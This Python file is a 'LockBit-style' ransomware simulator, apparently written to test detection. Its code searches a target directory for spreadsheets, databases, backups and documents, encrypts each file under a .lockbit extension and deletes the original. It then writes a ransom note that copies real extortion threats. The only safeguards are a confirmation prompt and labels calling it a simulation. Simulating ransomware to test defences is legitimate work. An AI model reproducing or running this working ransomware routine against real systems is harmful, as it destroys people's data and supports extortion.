"""
LockBit-style ransomware simulator
Targeted & Selective attack pattern
"""

import sys
import os
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from simulator.core.encryption import EncryptionEngine
from simulator.core.file_selector import FileSelector
from simulator.core.speed_controller import SpeedController


class LockBitSimulator:
    """
    Simulates LockBit-style ransomware attack
    
    Characteristics:
    - Targeted encryption (100 files/second)
    - Focuses on business-critical files (.xlsx, .sql, .bak, .docx)
    - Fast but selective
    - Adds .lockbit extension
    """
    
    def __init__(
        self,
        target_dir: str,
        speed: int = 100,
        encryption_algorithm: str = "fernet"
    ):
        """
        Initialize LockBit simulator
        
        Args:
            target_dir: Directory to attack
            speed: Files per second
            encryption_algorithm: Encryption method to use
        """
        self.target_dir = Path(target_dir)
        self.speed = speed
        self.encryption_algorithm = encryption_algorithm
        
        # Targeted extensions (business-critical files only)
        self.target_extensions = [
            '.xlsx', '.xls',      # Spreadsheets
            '.sql', '.bak',       # Databases
            '.docx', '.doc',      # Documents
            '.pptx', '.ppt'       # Presentations
        ]
        
        # Initialize components
        self.encryptor = EncryptionEngine(encryption_algorithm)
        self.file_selector = FileSelector(
            target_dir=str(self.target_dir),
            extensions=self.target_extensions,
            recursive=True
        )
        self.speed_controller = SpeedController(speed, "second")
        
        # Statistics
        self.files_encrypted = 0
        self.files_failed = 0
        self.total_bytes_encrypted = 0
    
    def encrypt_file(self, file_path: Path) -> bool:
        """
        Encrypt a single file and add .lockbit extension
        
        Args:
            file_path: Path to file to encrypt
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Read file
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Track size
            self.total_bytes_encrypted += len(data)
            
            # Encrypt
            encrypted = self.encryptor.encrypt(data)
            
            # Create new path with .lockbit extension
            new_path = file_path.with_suffix(file_path.suffix + '.lockbit')
            
            # Write encrypted file
            with open(new_path, 'wb') as f:
                f.write(encrypted)
            
            # Delete original
            file_path.unlink()
            
            print(f"[LOCKBIT] ✓ {file_path.name} → {new_path.name}")
            self.files_encrypted += 1
            return True
            
        except Exception as e:
            print(f"[LOCKBIT] ✗ Failed: {file_path} - {e}")
            self.files_failed += 1
            return False
    
    def leave_ransom_note(self):
        """Create LockBit-style ransom note"""
        note_content = """
>>> LockBit Ransomware <<<

Your files are encrypted and your data was downloaded.

═══════════════════════════════════════════════════════════

WHAT HAPPENED?
--------------
We encrypted all your important business files using strong
encryption algorithms. We also downloaded sensitive data from
your network.

═══════════════════════════════════════════════════════════

WHAT DO WE WANT?
----------------
We want money. After payment we will:
1. Provide decryption software
2. Delete your stolen data
3. Provide security report

═══════════════════════════════════════════════════════════

HOW TO CONTACT US?
------------------
Visit our TOR website: [REDACTED - THIS IS A SIMULATION]
Your unique ID: [REDACTED]

═══════════════════════════════════════════════════════════

⚠️  IMPORTANT WARNINGS ⚠️
-------------------------
- Do not rename encrypted files
- Do not try to decrypt using third-party software
- Do not contact recovery companies
- Do not ignore us

If you ignore this message:
- Your data will be published on our leak site
- Decryption will become impossible
- Ransom amount will double

═══════════════════════════════════════════════════════════

THIS IS A SIMULATION FOR SECURITY TESTING PURPOSES ONLY

═══════════════════════════════════════════════════════════
"""
        
        note_path = self.target_dir / "Restore-My-Files.txt"
        try:
            note_path.write_text(note_content)
            print(f"[LOCKBIT] Ransom note created: {note_path}")
        except Exception as e:
            print(f"[LOCKBIT] Failed to create ransom note: {e}")
    
    def run(self):
        """Execute the LockBit-style attack"""
        print("=" * 60)
        print("[LOCKBIT] LockBit-Style Ransomware Simulation")
        print("=" * 60)
        print(f"[LOCKBIT] Target: {self.target_dir}")
        print(f"[LOCKBIT] Speed: {self.speed} files/second (TARGETED)")
        print(f"[LOCKBIT] Encryption: {self.encryption_algorithm.upper()}")
        print(f"[LOCKBIT] Targeting: {', '.join(self.target_extensions)}")
        print("=" * 60)
        
        # Find targets
        print("[LOCKBIT] Scanning for business-critical files...")
        targets = self.file_selector.find_targets()
        print(f"[LOCKBIT] Found {len(targets)} target files")
        
        if not targets:
            print("[LOCKBIT] No business-critical files found. Exiting.")
            return
        
        # Show file statistics
        stats = self.file_selector.get_stats()
        print(f"[LOCKBIT] Target breakdown:")
        for ext, count in stats['by_extension'].items():
            print(f"[LOCKBIT]   {ext}: {count} files")
        
        # Start encryption
        print("[LOCKBIT] Starting targeted encryption...")
        self.speed_controller.start()
        
        for target in targets:
            self.encrypt_file(target)
            self.speed_controller.wait()
        
        # Leave ransom note
        self.leave_ransom_note()
        
        # Print statistics
        print("=" * 60)
        print("[LOCKBIT] Attack Complete!")
        print("=" * 60)
        print(f"Files encrypted: {self.files_encrypted}")
        print(f"Files failed: {self.files_failed}")
        print(f"Total data encrypted: {self.total_bytes_encrypted / 1024:.2f} KB")
        print(f"Time elapsed: {self.speed_controller.get_elapsed_time():.2f} seconds")
        print(f"Actual rate: {self.speed_controller.get_actual_rate():.2f} files/second")
        print("=" * 60)


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="LockBit-style ransomware simulator")
    parser.add_argument("target", help="Target directory to encrypt")
    parser.add_argument("--speed", type=int, default=100, help="Files per second (default: 100)")
    parser.add_argument("--algorithm", default="fernet", choices=["fernet", "aes256", "chacha20"],
                       help="Encryption algorithm (default: fernet)")
    
    args = parser.parse_args()
    
    # Confirm before running
    print(f"\n⚠️  WARNING: This will encrypt business-critical files in {args.target}")
    print("This is a TARGETED attack simulation.")
    print("This is for testing purposes only.")
    response = input("Continue? (yes/no): ")
    
    if response.lower() != "yes":
        print("Aborted.")
        return
    
    # Run simulation
    sim = LockBitSimulator(args.target, args.speed, args.algorithm)
    sim.run()


if __name__ == "__main__":
    main()
